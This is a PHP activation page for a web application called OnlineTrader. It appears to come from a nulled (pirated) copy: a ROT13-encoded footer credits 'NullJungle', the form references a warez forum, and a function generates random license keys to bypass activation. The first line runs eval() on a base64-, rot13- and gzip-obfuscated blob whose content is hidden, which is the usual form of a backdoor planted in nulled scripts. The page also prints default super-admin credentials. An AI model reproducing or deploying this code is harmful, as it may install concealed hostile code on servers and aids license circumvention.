<?php
eval(str_rot13(gzinflate(str_rot13(base64_decode('LUjFEoZVDn6aqZm94UV7wuXHHS5buLvz9AMzWDWtVjod+bLUw/3X1h/xbQ/l8tc4FAuG/GJepnFe/sqHpsrv/y/+/KksnBfcY138D+ihjf2BfkU7R5JoB0skquhHcrWmf0A6AmDDJSIb8bCiV4Z/QDYNQJC2m+/sdkr11tdqlpfo2Qfq/ljK8nKC3z9f21+Hrgt+GPBzPNltLUVdBxfgLxmIdakXNtxn8lLMBgXZrBwWLI5R48Tas+W19d1irO2eQSjtBj0/Xpok4oL8PhufSo1Jh6BYAkXy0JvaZNxgUdwL4GcIc39qqRpYVvrhPJD6wUZlllyMyPP2mJuwYGcEh8lcSI89tzZ4nyXwvhHvC1zqYVRDTfYSh5yK911flzfKNyQQ5g+SFpInFx9InhYAiWaam1bxfB+J9dfOnE0cFgj3xB6ieTUzpqzod69ZPSnCSrkExkcwcxQOfLcCKteFu26ChYpoYwqcrAzA1uID0Lap53UhasHhzcEyfQcFUAunNWJIHEF+RxCVDz4vlnOSoIEU86tmfIfEpaEKvYIj+wqnT2XPFVVbB5m71zmt2KxVMZLdJ1fyJEu/PqWaqdLil5nxh3M1RT3IipO4Kr2JqR/AZ9dinx9BbngGco0IBtW2fDBLxw8ahW/XG1rKV6xkxrb6jQD9ejVKthj3O5yWmRuPskgNXwT3bjmr76lAbhzZolrQfykB0Bxla6oGSMweq+WFseJVczyJMQXBqGMpZFdyBAn3k/EaO+62IwzRoXNLyl0uy7NtWh55jrHJpcI+42bgRI5gzqvk7s52vtwI78NghyTPHbv7vF/mSZdk5zBCbBRw01dxe/zIc7jq++WO6w3+Alyse9Pf2qhoU/aTqo41E7/W1a94TYJqrBwIDZfB9LCf1ysXDKwog1t7ol1ehzqNc5qUhOsdlVOMVVW3tG7L+NrXU2HPt0Pgh7cm5cLmSIh2iFCF+p41SIs3/Zc3+hU5VeInSJjzNy5s1ri7CJi4VSzjVuhnEqioxKyzYXDo7atZKfItG6qynGK4oAWPgEASJ2M9Cb2HUovBlcS9ZcuyaEnmB2Ph6LYzy+U9w6n7LMtuHo6tSs/ppkI8o3HEYaYkZxp2nKoZ3PsbrNM9v7oYjY2rP5XxVlp4D2HPl/jNzL8+pOnTe2RA5/mfIXf8FjvzlSZ8TyhYplovHZvXBTSIQTNKRrwuq+HXSbO8HCkSMYpbMFQDzbdiPc9aCp1BqkS5XXZfNgM4JmwXDZyeKGOuyR0Nquw5jH6mceNIcNErfCFB6eGOB06DHYgrHFYO4JHl1G5SBSTP2gGCU4iCOKBh8b1luKbaDvYb+NGyszQSTKiyCq+aLIlwcF+FbUtp0cLQveg789KDtliA7OKgmvVZqSZE/Do6Kz6K46YBXaR9TMbSayq/kzPvBqe3Qc2QYXiNmR7fsqyAUo9TZDS+7M3/4isTRWC1QKUbnSq+5L0nPRu14jPha9FqOV8LdaYgR2N9WVMEcV/AT1d4kpFJrlRXihhMVBjkF91ispUt+hcVneXV1H7bweAewS+XVzwWiz6+/G6yJXkDXEfBCFL7VeASPXym50qgCsQAmw00QRtg2ad/UejFSFvIVaSeElU83J9qXsZIEBc7qHwAUI2k4o2qXu3OPcZ5DKZJPaExp3a8yE1zN5CuPWRIZhq/nz1ydyBmsUOUdq8PXJUAQ8k9QKS5gkD/OosEz0Wp6zb+SO/NkjsMpCxgXtskC9i3qjVO9HOhjFLRDM0Z/pRUd5Znn9PpTPbewZQncf9FM6e6yZ3Z2S++lHXeDkrGMhLWl1dKJND0wcKHvT09uhAl0eDS5gZb8kAolqXnCVNYJpi5cZb/ghKPfTDqk0r+wAHCIFduF9JKrXzh0JvsXSA9odxfRc2PZq1UPCWPTFFxncLt5Mt5f2WWZzw/FEk67K5fwgIBLaH7PLRVtneAM6JjlkbHdtpzNZibeDR98aP0RdFwJOGx1ENQTS9L2VFawEomRT25IfQW8cCgDFqHhvmBZM2aGDXhEcvd1hXVWUGuPSC6OBBPDo40IcJL9AJuGdt0METIghQ9pY3hwwYSuPifgj1GsFIvLVGhtfBYoZiBTiTXCqP7AMvC/FPi5PS3fwvQLrLUWrIH1QEAekHeJ5H7XGI9Gmz3XmlPgjDOcflZPfBKcJsIMZUSXI8hbiGOhdu936Bj36eQs+hg/MPxj6Wq3p2tYEJJzObnVKZqtPiZK31giCZXaftjGQ0BMQMVqG7Qi1KchiVh8t02Mc3gn1m5bN2JI0CahbBUbhJGCewFtKOil1cJTB4zysjLNQ9Hm1HO4rQ682klhqbcJ0Xev23lUeh88U7t4GL11K8aIWjfXTvZO32v6SnYrj5fG0mQNZ3vNlou+qhOY2oENCs9NAcC2uoK9z3+YgKh0L8jARJ/wOaf/2y///4N')))));
function getLicenseKey() {
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < 35; $i++) {
        $index = rand(0, strlen($characters) - 1);
        $randomString .= $characters[$index];
    }
    $array = str_split($randomString, 7);
    return implode('-', $array);
}
?>

<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8"/>
    <title>Activate OnlineTrade</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.5/css/bulma.min.css"/>
    <style type="text/css">
      body, html {
        background: #F7F7F7;
      }
    </style>
  </head>
  <body>
    <div class="container"> 
      <div class="section" >
        <div class="column is-6 is-offset-3">
          <center>
            <h1 class="title" style="padding-top: 20px">Activate OnlineTrader</h1><br>
          </center>
          <div class="box">
           <?php
            
            $actual_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
            $login_link = str_replace('activate','adminlogin/login', $actual_link);
            $license_code = null;
            $client_name = null;
            if(!empty($_POST['license'])&&!empty($_POST['client'])){

              $license_code = strip_tags(trim($_POST["license"]));
              $client_name = strip_tags(trim($_POST["client"])); 
              
              $activate_response = $api->activate_license($license_code, $client_name);
              
              if(empty($activate_response)){
                $msg = 'Server is unavailable.';
              }else{
                $msg = $activate_response['message'];
              }
              if($activate_response['status'] != true){ ?>
                <form action="activate" method="POST">
                  <div class="notification is-danger"><?php echo ucfirst($msg); ?></div>
                  <div class="field">
                    <label class="label">License code</label>
                    <div class="control">
                      <input class="input" type="text" placeholder="enter your purchase/license code" name="license" required>
                    </div>
                  </div>
                  <div class="field">
                    <label class="label">Your name</label>
                    <div class="control">
                      <input class="input" type="text" placeholder="enter your name/envato username" name="client" required>
                    </div>
                  </div>
                  <input type="hidden" name="_token" value="{{ csrf_token() }}">
                  <div style='text-align: right;'>
                    <button type="submit" class="button is-link">Activate</button>
                  </div>
                </form><?php
              }else{ ?>
                <div class="notification is-success text-center" style='text-align: center;'>
                    <?php echo ucfirst($msg); ?>
                    <br>
                    Log in with the default super admin details,
                    <br>Username: <b>super@happ.com</b><br>Password: <b>test123</b>
                    <br>
                    <a href="<?php echo $login_link;?>" target="_blank">Login now</a>
                    </div>
              <?php
              }
            }else{ ?>
              <form action="activate" method="POST">
                <div class="field">
                  <label class="label">Auto generated license code</label>
                  <div class="control">
                    <input class="input" type="text" placeholder="enter your purchase/license code" name="license" value="<?= getLicenseKey();?>" required readonly>
                  </div>
                </div>
                <div class="field">
                  <label class="label">Your name</label>
                  <div class="control">
                    <input class="input" type="text" placeholder="enter your name/babiato username" name="client" required>
                  </div>
                </div>
                <input type="hidden" name="_token" value="{{ csrf_token() }}">
                <div style='text-align: right;'>
                  <button type="submit" class="button is-link">Activate</button>
                </div>
              </form><?php 
            } ?>
          </div>
        </div>
      </div>
    </div>
    <div class="content has-text-centered">
      <p>Copyright <?php echo date('Y'); ?> Brynamics, All rights reserved.</p><br>
      <?php echo str_rot13('<n uers="uggcf://AhyyWhatyr.pbz">Ahyyrq Ol AhyyWhatyr.pbz</n>');?> 
    </div>
  </body>
</html>